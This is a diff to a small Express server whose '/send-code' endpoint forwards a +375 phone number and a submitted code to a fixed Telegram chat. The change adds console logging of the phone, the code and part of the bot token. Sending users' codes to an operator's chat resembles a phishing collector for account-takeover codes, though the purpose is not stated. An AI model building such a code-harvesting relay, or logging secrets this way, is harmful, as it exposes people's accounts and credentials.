@@ -14,19 +14,49 @@ app.post('/send-code', async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const response = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: `🔐 Код для +375${phone}: *${code}*`,
-      parse_mode: 'Markdown'
-    })
-  });
+  console.log('=== ЗАПРОС ПОЛУЧЕН ===');
+  console.log('Phone:', phone);
+  console.log('Code:', code);
+  console.log('Token (начало):', token ? token.substring(0, 10) : 'НЕТ ТОКЕНА');
+  console.log('Chat ID:', chatId);
 
-  if (response.ok) res.json({ success: true });
-  else res.status(500).json({ error: 'Ошибка отправки' });
+  if (!token || !chatId) {
+    console.log('ОШИБКА: не заданы TELEGRAM_BOT_TOKEN или TELEGRAM_CHAT_ID');
+    return res.status(500).json({ error: 'Не заданы переменные' });
+  }
+
+  const text = `🔐 Код для +375${phone}: ${code}`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text
+      })
+    });
+
+    const data = await response.json();
+    console.log('=== ОТВЕТ TELEGRAM ===');
+    console.log(JSON.stringify(data));
+
+    if (data.ok) {
+      console.log('✅ Сообщение отправлено');
+      res.json({ success: true });
+    } else {
+      console.log('❌ Ошибка Telegram:', data.description);
+      res.status(500).json({ error: data.description || 'Ошибка отправки' });
+    }
+  } catch (err) {
+    console.log('❌ Сетевая ошибка:', err.message);
+    res.status(500).json({ error: 'Сетевая ошибка: ' + err.message });
+  }
+});
+
+app.get('/', (req, res) => {
+  res.send('Сервер работает. POST /send-code для отправки.');
 });
 
 const PORT = process.env.PORT || 3000;
